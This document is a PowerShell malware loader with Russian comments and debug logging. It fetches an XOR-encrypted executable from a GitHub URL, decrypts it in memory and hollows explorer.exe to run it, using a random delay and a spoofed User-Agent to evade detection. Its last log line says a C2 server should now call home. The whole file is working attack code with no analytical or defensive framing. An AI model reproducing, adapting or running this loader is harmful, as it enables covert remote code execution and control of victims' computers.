# disk.ps1 — DEBUG VERSION (пишем в debug_log.txt в папке first.ps1)
$logPath = "$PSScriptRoot\debug_log.txt"
if (!(Test-Path $logPath)) { $logPath = "$env:TEMP\debug_disk.txt" }  # запасной вариант
function Log($msg) {
    $t = Get-Date -Format "HH:mm:ss.fff"
    "$t  | disk → $msg" | Out-File -FilePath $logPath -Append -Encoding UTF8
}

Log "disk.ps1 СТАРТОВАЛ"

Start-Sleep -Milliseconds (Get-Random -Min 1200 -Max 2600)
Log "Jitter прошёл"

$exeUrl = 'https://github.com/jokerxgutea/testhtb/raw/refs/heads/main/hh3tgn_enc.exe'
Log "Скачиваем зашифрованный EXE: $exeUrl"

try {
    $wc = New-Object Net.WebClient
    $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130'
    $enc = $wc.DownloadData($exeUrl)
    Log "EXE скачан — $($enc.Length) байт"
} catch {
    Log "ОШИБКА СКАЧИВАНИЯ EXE: $_"
    return
}

Log "Расшифровываем XOR 0xAA..."
$exe = [byte[]]$enc.Length
for($i=0;$i -lt $enc.Length;$i++) { $exe[$i] = $enc[$i] -bxor 0xAA }
$header = [BitConverter]::ToString($exe[0..3]) -replace '-',' '
Log "Первые байты после расшифровки: $header (должно быть 4D 5A ...)"

Log "Ищем explorer.exe..."
$proc = Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -First 1
if (!$proc) { Log "КРИТИЧЕСКАЯ ОШИБКА: explorer.exe не найден!"; return }
Log "Найден explorer PID: $($proc.Id)"

# Add-Type и hollowing с логами — сокращу, чтобы влезло
Add-Type -MemberDefinition @'
using System; using System.Runtime.InteropServices;
public class H {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, uint c);
    [DllImport("ntdll.dll")] public static extern uint NtSuspendProcess(IntPtr h);
    [DllImport("ntdll.dll")] public static extern uint NtUnmapViewOfSection(IntPtr h, IntPtr b);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenThread(uint a, bool b, uint tid);
    [DllImport("kernel32.dll")] public static extern bool GetThreadContext(IntPtr h, byte[] c);
    [DllImport("kernel32.dll")] public static extern bool SetThreadContext(IntPtr h, byte[] c);
    [DllImport("ntdll.dll")] public static extern uint NtResumeProcess(IntPtr h);
}
'@

$hProc = [H]::OpenProcess(0x1F0FFF,$false,$proc.Id)
Log "OpenProcess = $hProc"
[H]::NtSuspendProcess($hProc); Log "explorer приостановлен"
$th = [H]::OpenThread(0x1F03FF,$false,$proc.Threads[0].Id)
$ctx = [byte[]]1160
[H]::GetThreadContext($th,$ctx); Log "Контекст получен"

$base = [BitConverter]::ToInt64($ctx,0x10)
Log "База explorer: 0x$('{0:X}' -f $base)"
[H]::NtUnmapViewOfSection($hProc,[IntPtr]$base); Log "Старая база выгружена"

$newBase = [H]::VirtualAllocEx($hProc,[IntPtr]$base,$exe.Length,0x3000,0x40)
Log "Выделили память: 0x$('{0:X}' -f $newBase)"

$w=0; [H]::WriteProcessMemory($hProc,$newBase,$exe,$exe.Length,[ref]$w) | Out-Null
Log "Записано $w байт"

$entryRva = [BitConverter]::ToUInt32($exe, [BitConverter]::ToUInt32($exe,0x3C)+0x28)
$entry = [Int64]$newBase + $entryRva
$entryBytes = [BitConverter]::GetBytes($entry)
[Array]::Copy($entryBytes,0,$ctx,0xB8,8)
[H]::SetThreadContext($th,$ctx); Log "RIP установлен на entry point"

[H]::NtResumeProcess($hProc)
Log "EXPLORER ВОЗОБНОВЛЁН — PAYLOAD ЗАГРУЖЕН УСПЕШНО!"
Log "Если C2 живой — он сейчас должен позвонить домой"
